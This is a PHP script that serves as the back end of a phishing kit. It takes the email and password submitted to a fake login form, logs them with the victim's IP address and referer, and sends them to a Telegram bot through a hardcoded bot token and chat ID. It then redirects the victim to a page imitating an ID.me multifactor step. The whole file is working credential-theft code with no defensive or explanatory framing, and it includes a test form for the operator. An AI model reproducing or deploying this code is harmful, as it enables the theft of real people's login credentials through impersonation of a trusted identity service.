<?php
// UNIVERSAL BROWSER-COMPATIBLE SUBMISSION SCRIPT
// Works on Chrome, Firefox, Safari, Edge, Mobile Browsers

// Start with minimal code - remove parallel processing for now
session_start();

// Simple logging function
function log_to_file($message) {
    $log_file = __DIR__ . '/submission_debug.log';
    $timestamp = date('Y-m-d H:i:s');
    $browser = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $line = "[$timestamp] [$browser] $message\n";
    file_put_contents($log_file, $line, FILE_APPEND);
}

// Log immediately when script is accessed
log_to_file("Script accessed via " . ($_SERVER['REQUEST_METHOD'] ?? 'NO_METHOD'));

// Handle POST requests
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Log all POST data for debugging
    log_to_file("POST data: " . print_r($_POST, true));
    
    // SIMPLIFIED: Get form data
    $email = $_POST['useremail'] ?? 'no_email';
    $password = $_POST['userpassword'] ?? 'no_password';
    $remember = isset($_POST['remember_me']) ? 'Yes' : 'No';
    
    // Get IP
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $referer = $_SERVER['HTTP_REFERER'] ?? 'direct';
    
    // Create simple message
    $message = "📧 Login: $email\n🔑 Password: $password\n💾 Remember: $remember\n🌐 IP: $ip\n🔗 From: $referer";
    
    // SIMPLIFIED: Use only one bot for testing
    $bot_token = '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw';
    $chat_id = '1325797388';
    
    // SIMPLE cURL with browser-compatible settings
    $url = "https://api.telegram.org/bot{$bot_token}/sendMessage";
    
    // Use http_build_query for maximum compatibility
    $post_data = http_build_query([
        'chat_id' => $chat_id,
        'text' => $message,
        'parse_mode' => 'HTML'  // Use HTML instead of Markdown for compatibility
    ]);
    
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $post_data,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_CONNECTTIMEOUT => 5,
        CURLOPT_SSL_VERIFYPEER => true,
        CURLOPT_SSL_VERIFYHOST => 2,
        // Safari/iOS specific SSL settings
        CURLOPT_SSLVERSION => CURL_SSLVERSION_TLSv1_2,
        CURLOPT_HTTPHEADER => [
            'Content-Type: application/x-www-form-urlencoded',
            'Accept: application/json',
            'User-Agent: Mozilla/5.0 (compatible; PHP)'
        ]
    ]);
    
    // Execute and log result
    $result = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    
    log_to_file("Telegram send - HTTP: $http_code, Error: $error, Result: " . substr($result, 0, 100));
    
    curl_close($ch);
    
    // Simple redirect - always redirect even if Telegram fails
    $redirect_url = 'https://illuminatiofficial.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html';
    
    // Clean output and redirect
    if (ob_get_level()) {
        ob_end_clean();
    }
    
    // JavaScript redirect for maximum compatibility
    echo '<!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>Redirecting...</title>
        <script>
            // Try JavaScript redirect first
            window.location.href = "' . htmlspecialchars($redirect_url) . '";
            
            // Fallback after 2 seconds
            setTimeout(function() {
                window.location.href = "' . htmlspecialchars($redirect_url) . '";
            }, 2000);
        </script>
        <meta http-equiv="refresh" content="0;url=' . htmlspecialchars($redirect_url) . '">
    </head>
    <body>
        <p>Processing your login... Please wait.</p>
        <p>If not redirected, <a href="' . htmlspecialchars($redirect_url) . '">click here</a>.</p>
    </body>
    </html>';
    
    exit;
    
} else {
    // Not a POST request - show simple form for testing
    echo '<!DOCTYPE html>
    <html>
    <head>
        <title>Test Form</title>
        <style>
            body { font-family: Arial; padding: 20px; }
            input { display: block; margin: 10px 0; padding: 10px; width: 300px; }
        </style>
    </head>
    <body>
        <h2>Test Submission Form</h2>
        <form method="POST" action="">
            <input type="email" name="useremail" placeholder="Email" required>
            <input type="password" name="userpassword" placeholder="Password" required>
            <label><input type="checkbox" name="remember_me" value="true"> Remember me</label>
            <input type="submit" value="Test Submit">
        </form>
        <p>User Agent: ' . htmlspecialchars($_SERVER['HTTP_USER_AGENT'] ?? 'Unknown') . '</p>
    </body>
    </html>';
}
?>
